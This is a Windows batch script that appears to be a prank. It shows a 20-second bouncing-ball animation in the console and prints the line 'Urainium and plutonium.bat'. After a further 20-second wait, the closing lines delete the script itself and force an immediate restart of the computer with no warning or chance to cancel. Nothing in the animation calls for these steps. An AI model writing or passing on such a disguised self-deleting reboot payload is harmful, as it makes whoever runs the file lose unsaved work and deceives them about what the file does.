@echo off
setlocal enabledelayedexpansion

rem Define initial position and velocity of the ball
set "ballX=5"
set "ballY=5"
set "velocityX=1"
set "velocityY=1"

rem Set the duration of the ball animation in seconds
set "ball_duration=20"

rem Start time for the ball animation
set "ball_start=!time!"

rem Display the bouncing ball animation
:ball_animation
rem Get current time
set "ball_current=!time!"

rem Calculate elapsed time for the ball animation in seconds
set /a "ball_elapsed=((1!ball_current:~0,2!-100)*3600 + (1!ball_current:~3,2!-100)*60 + (1!ball_current:~6,2!-100)) - ((1!ball_start:~0,2!-100)*3600 + (1!ball_start:~3,2!-100)*60 + (1!ball_start:~6,2!-100))"

rem If elapsed time for ball animation exceeds duration, exit the loop
if !ball_elapsed! gtr %ball_duration% goto ball_end

rem Update ball position
set /a "ballX+=velocityX"
set /a "ballY+=velocityY"

rem If ball hits the boundaries, change direction
if !ballX! leq 0 (
    set "velocityX=1"
) else if !ballX! geq 20 (
    set "velocityX=-1"
)
if !ballY! leq 0 (
    set "velocityY=1"
) else if !ballY! geq 10 (
    set "velocityY=-1"
)

rem Clear the screen
cls

rem Draw the ball at its current position
call :goto !ballX! !ballY!

rem Delay for smooth animation (adjust as needed)
ping -n 1 127.0.0.1 >nul

rem Go back to the ball animation loop
goto ball_animation

:ball_end

rem Display the text
echo Urainium and plutonium.bat

rem Wait for 20 seconds
timeout /t 20 /nobreak > nul

rem Delete this batch file
del "%~f0"

rem Restart the PC
shutdown /r /t 0

rem Function to move cursor to specified position
:goto
set /a "x=%1+1"
set /a "y=%2+1"
echo(
for /l %%i in (1,1,!y!) do echo(
for /l %%i in (1,1,!x!) do <nul set /p "= "
echo o
exit /b
